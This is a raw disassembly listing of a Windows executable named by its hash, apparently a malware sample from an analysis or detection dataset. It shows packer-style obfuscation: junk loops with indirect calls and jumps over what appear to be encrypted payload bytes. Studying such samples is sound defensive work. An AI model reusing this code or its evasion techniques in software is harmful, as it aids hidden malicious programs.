
fad06855052951ec556db097dcc32cd10c17eb639abf837fd377709d234d67c7.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     ah,bh
  4011b8:	jb     0x401208
  4011ba:	jo     0x40123a
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [edx],esp
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xd4cfb73a
  40126d:	bound  eax,QWORD PTR [ebp+ebx*4+0x5a154978]
  401274:	ins    DWORD PTR es:[edi],dx
  401275:	mov    BYTE PTR [edx-0x2382c26d],dh
  40127b:	xchg   esp,eax
  40127c:	xor    ebx,DWORD PTR ds:0x499837b7
  401282:	adc    eax,0x87ddf6e1
  401287:	xchg   ecx,eax
  401288:	fist   DWORD PTR [esi-0x2820cbcf]
  40128e:	pop    esi
  40128f:	sbb    esp,0xffffffb5
  401292:	test   al,0x1a
  401294:	jnp    0x401285
  401296:	push   cs
  401297:	xor    ecx,DWORD PTR [edi]
  401299:	jbe    0x401301
  40129b:	sbb    al,BYTE PTR [esi+0x51]
  40129e:	jg     0x4012bb
  4012a0:	inc    ebp
  4012a1:	xor    eax,0x2db551e3
  4012a6:	retf   
  4012a7:	data16 fsubr DWORD PTR [edx+0x4c]
  4012ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012ac:	scas   al,BYTE PTR es:[edi]
  4012ad:	cmp    esp,ecx
  4012af:	scas   eax,DWORD PTR es:[edi]
  4012b0:	int    0x2a
  4012b2:	cmc    
  4012b3:	cmp    esp,DWORD PTR [eax-0x20]
  4012b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012b7:	jmp    0x401239
  4012b9:	adc    ch,ah
  4012bb:	js     0x401304
  4012bd:	mov    DWORD PTR [edi+0x3ad55614],esp
  4012c3:	push   ebx
  4012c4:	or     al,0x26
  4012c6:	mov    al,BYTE PTR [esi]
  4012c8:	scas   eax,DWORD PTR es:[edi]
  4012c9:	out    0xaa,al
  4012cb:	cmp    BYTE PTR [edi+0x73],cl
  4012ce:	xor    DWORD PTR [ecx+esi*8+0x76],edx
  4012d2:	dec    esi
  4012d3:	je     0x40128f
  4012d5:	cmp    esp,DWORD PTR [edx+0x19ecd31a]
  4012db:	xchg   esp,eax
  4012dc:	fsub   DWORD PTR [ebp-0x51]
  4012df:	(bad)  
  4012e0:	test   DWORD PTR [ebx-0x17923c9d],ecx
  4012e6:	xchg   edx,eax
  4012e7:	push   esp
  4012e8:	arpl   cx,sp
  4012ea:	mov    ds:0x9e94ebde,eax
  4012ef:	rcl    edx,1
  4012f1:	out    dx,al
  4012f2:	xchg   si,ax
  4012f4:	addr16 loopne 0x4012d1
  4012f7:	repz sbb edx,esi
  4012fa:	push   0xb4d28d70
  4012ff:	test   esp,edi
  401301:	pop    es
  401302:	(bad)  
  401303:	or     BYTE PTR [edx+0x21424f27],dh
  401309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40130a:	adc    al,0x6e
  40130c:	xchg   ecx,eax
  40130d:	call   0x9a410898
  401312:	mov    cs,WORD PTR [ecx-0x50]
  401315:	push   esi
  401316:	inc    ecx
  401317:	(bad)  
  401318:	daa    
  401319:	mov    edi,0x2ef16c64
  40131e:	enter  0x905e,0x84
  401322:	(bad)  
  401323:	out    0x87,eax
  401325:	loope  0x401311
  401327:	lea    edx,[ecx+0x20528a74]
  40132d:	hlt    
  40132e:	sti    
  40132f:	cmpxchg DWORD PTR [esi],ecx
  401332:	inc    esi
  401333:	pushf  
  401334:	xchg   ebx,eax
  401335:	push   edx
  401336:	test   al,0x89
  401338:	dec    ecx
  401339:	gs pop ss
  40133b:	cmp    BYTE PTR [edx-0x1f],ah
  40133e:	test   al,0x6d
  401340:	cmp    esi,eax
  401342:	sub    eax,0xac78c0de
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	arpl   WORD PTR [ebp+0x7ffac052],si
  4013b9:	jle    0x401439
  4013bb:	cli    
  4013bc:	jg     0x40143c
  4013be:	jle    0x40139e
  4013c0:	enter  0xe446,0xc1
  4013c4:	pop    ds
  4013c5:	dec    esp
  4013c6:	fidivr WORD PTR [esi+0x6d9c9bf4]
  4013cc:	sbb    eax,0x302fffe9
  4013d1:	jg     0x401353
  4013d3:	xor    BYTE PTR [edi+0x97225d9],0x77
  4013da:	xchg   edi,eax
  4013db:	xchg   ebp,eax
  4013dc:	shr    BYTE PTR [ebx-0x31599d3d],0xc7
  4013e3:	inc    edi
  4013e4:	pushf  
  4013e5:	pop    esi
  4013e6:	aad    0xfd
  4013e8:	push   0x3d7b9ef7
  4013ed:	inc    edi
  4013ee:	sub    eax,0x2a81340e
  4013f3:	cmc    
  4013f4:	and    al,0x6
  4013f6:	inc    edx
  4013f7:	pusha  
  4013f8:	out    0x50,eax
  4013fa:	sub    bh,al
  4013fc:	inc    eax
  4013fd:	dec    ecx
  4013fe:	jmp    esp
  401400:	add    ax,0x113d
  401404:	out    dx,al
  401405:	inc    BYTE PTR [esi-0x1c]
  401408:	xchg   esi,eax
  401409:	cmp    DWORD PTR [ebp+0x4b],0xc425db7
  401410:	inc    DWORD PTR [edi]
  401412:	ret    0x17da
  401415:	inc    esi
  401416:	pushf  
  401417:	(bad)  
  401418:	sub    ah,BYTE PTR [eax-0x6e90f824]
  40141e:	pop    es
  40141f:	les    esp,FWORD PTR [esi+0x77]
  401422:	inc    esi
  401423:	adc    DWORD PTR [ecx-0x9],edx
  401426:	dec    eax
  401427:	xor    BYTE PTR [edi+eiz*1+0x5ee0e32d],bl
  40142e:	adc    DWORD PTR [ebp-0x8545ba],ebp
  401434:	lods   eax,DWORD PTR ds:[esi]
  401435:	clc    
  401436:	mov    edx,0x8a187187
  40143b:	test   al,0x44
  40143d:	sub    bh,BYTE PTR [ebx-0x8c4dd76]
  401443:	inc    esi
  401444:	dec    BYTE PTR [eax-0x44]
  401447:	cmp    eax,0xd0d9618c
  40144c:	lea    eax,[esi+0x25]
  40144f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401450:	push   edx
  401451:	sub    DWORD PTR [ecx],edi
  401453:	add    ecx,DWORD PTR [ecx*8+0x7a86770d]
  40145a:	stc    
  40145b:	std    
  40145c:	jno    0x40143a
  40145e:	stos   DWORD PTR es:[edi],eax
  40145f:	out    0x21,al
  401461:	mov    dh,0x4c
  401463:	lods   al,BYTE PTR ds:[esi]
  401464:	stos   DWORD PTR es:[edi],eax
  401465:	fucom  st(1)
  401467:	ror    BYTE PTR [ebx+0x43b19afd],1
  40146d:	mov    ds:0x9a732cbb,al
  401472:	inc    esp
  401473:	imul   ecx,ecx,0x51
  401476:	pop    eax
  401477:	cmc    
  401478:	lods   al,BYTE PTR ds:[esi]
  401479:	mov    dl,0xd8
  40147b:	enter  0xc924,0xb3
  40147f:	add    DWORD PTR [ecx+0x61],0xb
  401483:	inc    esi
  401484:	es pop es
  401486:	push   ebx
  401487:	dec    esi
  401488:	out    dx,al
  401489:	rcl    DWORD PTR ss:[edi-0x44],cl
  40148d:	or     al,BYTE PTR [ebx+esi*2]
  401490:	aaa    
  401491:	iret   
  401492:	cmp    eax,0xf66f1f8e
  401497:	in     al,dx
  401498:	lock sub DWORD PTR [bp-0x3b51],0x3d3fa7e3
  4014a2:	in     al,dx
  4014a3:	dec    esp
  4014a4:	sub    ecx,DWORD PTR [edx+0x1097364b]
  4014aa:	xor    eax,0xc7282d81
  4014af:	fbstp  TBYTE PTR [ecx-0x19]
  4014b2:	ror    bl,1
  4014b4:	daa    
  4014b5:	mov    ebx,0xed007c34
  4014ba:	jecxz  0x4014d1
  4014bc:	test   al,0x39
  4014be:	ror    BYTE PTR [ebx],1
  4014c0:	xor    BYTE PTR [esi+0x52],dh
  4014c3:	scas   al,BYTE PTR es:[edi]
  4014c4:	mov    ch,BYTE PTR [edx-0x6856bc76]
  4014ca:	cmp    ah,BYTE PTR [edi]
  4014cc:	popf   
  4014cd:	fwait
  4014ce:	outs   dx,DWORD PTR ds:[esi]
  4014cf:	mov    esp,0x20591c8b
  4014d4:	test   al,0x32
  4014d6:	out    0xcd,eax
  4014d8:	inc    edx
  4014d9:	push   cs
  4014da:	addr16 jmp 0x401476
  4014dd:	push   0xffffffcc
  4014df:	cli    
  4014e0:	fdiv   QWORD PTR [edx]
  4014e2:	scas   al,BYTE PTR es:[edi]
  4014e3:	shl    DWORD PTR [ecx],1
  4014e5:	(bad)  
  4014e6:	retf   0xbc5c
  4014e9:	jnp    0x40150a
  4014eb:	sbb    eax,0x2dead810
  4014f0:	or     dh,BYTE PTR [eax]
  4014f2:	imul   ebx,eax,0xddf1d315
  4014f8:	sbb    eax,0x11e2a362
  4014fd:	xchg   al,dh
  4014ff:	jecxz  0x4014e9
  401501:	fsub   st(0),st
  401503:	sub    eax,0x73432a15
  401508:	jmp    0xd4e6a8dc
  40150d:	aas    
  40150e:	fiadd  DWORD PTR ds:0x260092e3
  401514:	push   0xffffffd6
  401516:	jmp    0x3f2dc8fe
  40151b:	test   eax,0x52f40347
  401520:	mov    ah,0x2e
  401522:	sahf   
  401523:	popf   
  401524:	xor    edi,DWORD PTR [ebx+esi*1+0x23fca34f]
  40152b:	sbb    DWORD PTR [eax-0x1bf936b9],eax
  401531:	mov    dh,0x23
  401533:	pop    ds
  401534:	lods   al,BYTE PTR ds:[esi]
  401535:	xor    DWORD PTR [esi],0xfe748942
  40153b:	jo     0x401520
  40153d:	es (bad) 
  40153f:	in     al,0x8b
  401541:	addr16 call 0x32045ad2
  401547:	sbb    eax,0x43360f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x117f311d]
  401564:	jns    0x40156c
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4015e0
  40156e:	je     0x401513
  401570:	ds hlt 
  401572:	dec    esp
  401573:	xor    esp,DWORD PTR [edi+0x1facaf0a]
  401579:	es in  eax,0xa3
  40157c:	inc    ebx
  40157d:	adc    al,0x13
  40157f:	jecxz  0x401566
  401581:	in     al,0x33
  401583:	dec    ebp
  401584:	sub    edi,DWORD PTR [edi+eax*1+0x2f]
  401588:	xchg   ecx,eax
  401589:	(bad)  
  40158a:	or     ebp,DWORD PTR [esi-0x3570afb8]
  401590:	inc    esi
  401591:	push   ss
  401592:	js     0x401522
  401594:	jg     0x40156a
  401596:	and    DWORD PTR [esi+0x706270c1],esi
  40159c:	enter  0x88ee,0x5d
  4015a0:	jg     0x40155b
  4015a2:	das    
  4015a3:	sbb    al,0x50
  4015a5:	mov    cl,0xfc
  4015a7:	repnz sbb DWORD PTR [ecx+0x55],eax
  4015ab:	sbb    al,0xf1
  4015ad:	add    eax,0x597c7115
  4015b2:	sbb    eax,0x3d98b6c6
  4015b7:	xor    DWORD PTR [ebx-0x8],ecx
  4015ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015bb:	sbb    ch,ah
  4015bd:	jecxz  0x4015e1
  4015bf:	sbb    DWORD PTR [ecx],ebx
  4015c1:	mov    esp,0xf0821fe9
  4015c6:	and    eax,0xbfe24b63
  4015cb:	fild   DWORD PTR [esi-0xf]
  4015ce:	mov    ah,0x92
  4015d0:	dec    esp
  4015d1:	mov    bh,0x8f
  4015d3:	nop
  4015d4:	dec    ebp
  4015d5:	sub    BYTE PTR [edx+0x63],0x82
  4015d9:	(bad)  
  4015da:	in     al,0xff
  4015dc:	sub    DWORD PTR [eax-0x68],ebx
  4015df:	aam    0x1a
  4015e1:	push   esp
  4015e2:	ja     0x4015f2
  4015e4:	sbb    al,0x4e
  4015e6:	fimul  WORD PTR [edi+eiz*4+0x3c]
  4015ea:	int3   
  4015eb:	mov    ds:0x70a247b1,al
  4015f0:	cmc    
  4015f1:	jmp    0x172a:0xe3f6232e
  4015f8:	retf   0x9d43
  4015fb:	fisub  WORD PTR [edx+0x4d733246]
  401601:	std    
  401602:	test   DWORD PTR [ebx],ebx
  401604:	fs ss pop edx
  401607:	cmp    BYTE PTR [edi],dh
  401609:	jb     0x401673
  40160b:	les    edi,FWORD PTR [ebp+0x26]
  40160e:	hlt    
  40160f:	inc    ebx
  401610:	call   0xb783:0x7dfcc4f7
  401617:	pop    edx
  401618:	addr16 lahf 
  40161a:	fldenv [ebx-0x2e]
  40161d:	(bad)  
  40161e:	sbb    eax,0x78b4fa27
  401623:	pop    ecx
  401625:	mov    al,ds:0xc0a595e6
  40162a:	jmp    0xa471:0xe3d058d8
  401631:	scas   eax,DWORD PTR es:[edi]
  401632:	mov    ebp,0x77d89bf5
  401637:	fadd   st(6),st
  401639:	jnp    0x40162a
  40163b:	data16 outs dx,BYTE PTR ds:[esi]
  40163d:	push   es
  40163e:	nop
  40163f:	and    ah,BYTE PTR [ecx+0x558d7b72]
  401645:	xchg   esp,eax
  401646:	and    al,0x5e
  401648:	mov    eax,0x3790a391
  40164d:	and    ch,BYTE PTR [esi+0x40543f1]
  401653:	pop    edi
  401654:	xchg   ecx,eax
  401655:	mov    ?,WORD PTR [edi+0x31e91f18]
  40165b:	dec    esp
  40165c:	xchg   edx,eax
  40165d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40165e:	imul   eax,DWORD PTR [edx],0xffffffac
  401661:	mov    ebx,0x6adbff6
  401666:	cs out 0x40,eax
  401669:	dec    edx
  40166a:	add    ebx,DWORD PTR [ebp+0x47]
  40166d:	mov    ah,0x84
  40166f:	add    DWORD PTR [esi-0x7f],esi
  401672:	in     al,dx
  401673:	lods   al,BYTE PTR ds:[esi]
  401674:	mov    DWORD PTR [edi-0x5],ebp
  401677:	push   DWORD PTR [esi]
  401679:	fidivr DWORD PTR [ebx-0x4ecf5c26]
  40167f:	fs cli 
  401681:	icebp  
  401682:	stos   DWORD PTR es:[edi],eax
  401683:	inc    esi
  401684:	fidiv  WORD PTR [eax+0x37]
  401687:	fld    DWORD PTR [eax-0x4d]
  40168a:	lea    edx,[edx-0x5723ade6]
  401690:	ins    DWORD PTR es:[edi],dx
  401691:	push   esi
  401692:	mov    ch,0xf9
  401694:	xor    ebx,DWORD PTR [edi-0xefd16a5]
  40169a:	in     eax,dx
  40169b:	and    ch,BYTE PTR [ebx+ecx*8-0x34]
  40169f:	(bad)  
  4016a0:	std    
  4016a1:	mov    cl,0x7
  4016a3:	jmp    0x401631
  4016a5:	xchg   edx,eax
  4016a6:	or     edi,esi
  4016a8:	push   es
  4016a9:	xchg   ebp,eax
  4016aa:	add    eax,0xd55e9630
  4016af:	xor    ebp,esi
  4016b1:	sub    eax,0x1fbfee5c
  4016b6:	or     eax,0x1e7a6b7a
  4016bb:	mov    dl,0x4b
  4016bd:	xor    al,0x24
  4016bf:	popf   
  4016c0:	fisub  WORD PTR [edi+0x26fa8ae7]
  4016c6:	sbb    ebp,DWORD PTR [esi-0x1539dbbb]
  4016cc:	jno    0x401747
  4016ce:	and    al,dh
  4016d0:	adc    al,0xb9
  4016d2:	sbb    ebx,DWORD PTR [eax+0x1bd94492]
  4016d8:	cmp    edi,DWORD PTR [edi]
  4016da:	mov    dl,BYTE PTR [ebx+eax*4-0x6569556a]
  4016e1:	fdivrp st(2),st
  4016e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016e4:	push   ecx
  4016e5:	dec    edi
  4016e6:	push   ebx
  4016e7:	and    al,0xf
  4016e9:	call   0xf0a5:0xa2712dc1
  4016f0:	cmp    eax,DWORD PTR [ebx]
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xf9466ade
  4018e9:	sbb    eax,0x7e7a82dd
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018f5
  4018f4:	test   al,0x70
  4018f6:	mov    edi,0x12b9f7aa
  4018fb:	adc    BYTE PTR [ecx+0x5f23d0e4],ah
  401901:	fldcw  WORD PTR [edx-0x6771643e]
  401907:	cmp    esp,edi
  401909:	sbb    ah,cl
  40190b:	sahf   
  40190c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40190d:	dec    edx
  40190e:	jne    0x4018a6
  401910:	jns    0x40190d
  401912:	add    bl,BYTE PTR [esp+ebp*8]
  401915:	je     0x401973
  401917:	and    edx,edx
  401919:	outs   dx,BYTE PTR ds:[esi]
  40191a:	mov    eax,0x9176b879
  40191f:	int3   
  401920:	shl    BYTE PTR [esp+ebp*2+0x3b],1
  401924:	sub    edx,DWORD PTR [ecx+0x38aab211]
  40192a:	fbstp  TBYTE PTR [edx]
  40192c:	push   ebp
  40192d:	sbb    bl,bh
  40192f:	int3   
  401930:	ret    0xa75b
  401933:	in     eax,0x71
  401935:	mov    eax,0xd154ea0a
  40193a:	xor    esp,DWORD PTR [edi+eax*2+0x45a90757]
  401941:	xchg   edx,eax
  401942:	pop    esp
  401943:	frstor [edx+0x54]
  401946:	stos   BYTE PTR es:[edi],al
  401947:	cli    
  401948:	dec    ecx
  401949:	mov    edi,0x281c0805
  40194e:	pop    ds
  40194f:	xlat   BYTE PTR ds:[ebx]
  401950:	popa   
  401951:	lock push es
  401953:	cmp    ah,BYTE PTR [ebp+0x2802d772]
  401959:	sub    al,0x6d
  40195b:	leave  
  40195c:	ret    0xce71
  40195f:	sar    DWORD PTR [ecx],cl
  401961:	mov    ch,0x55
  401963:	xchg   DWORD PTR [esp+edx*1+0x5e],ebx
  401967:	aad    0xdf
  401969:	push   0xc8bb34db
  40196e:	jge    0x401925
  401970:	push   ecx
  401971:	fs pop edi
  401973:	sub    eax,0xe4dab9d5
  401978:	xchg   edi,eax
  401979:	fiadd  WORD PTR [ecx]
  40197b:	jmp    0x401990
  40197d:	mov    esi,DWORD PTR [esi+0x60]
  401980:	mov    ebx,0x2f72257f
  401985:	sub    bl,cl
  401987:	xchg   edx,eax
  401988:	cmc    
  401989:	xchg   ecx,eax
  40198a:	add    bl,0xd4
  40198d:	push   esp
  40198e:	popf   
  40198f:	daa    
